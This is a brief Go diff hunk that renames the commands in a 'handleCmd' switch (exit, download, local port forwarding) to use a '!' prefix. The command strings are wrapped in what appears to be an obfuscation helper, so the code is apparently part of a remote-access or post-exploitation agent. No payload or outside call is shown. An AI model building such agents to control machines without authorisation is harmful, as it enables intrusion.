@@ -144,12 +144,12 @@ func handleCmd(buf []byte) []byte {
 	case utils.Bake("§!exit§"):
 		// defer exit so we can sent it to the client aswell
 		go quit()
-	case utils.Bake("§download§"):
+	case utils.Bake("§!download§"):
 		if len(argv) == 3 {
 			dst := argv[2]
 			go utils.DownloadListen(dst, session)
 		}
-	case utils.Bake("§lfwd§"):		
+	case utils.Bake("§!lfwd§"):		
 		if len(argv) == 4 {
 			lport := argv[1]
 			raddr := argv[2]
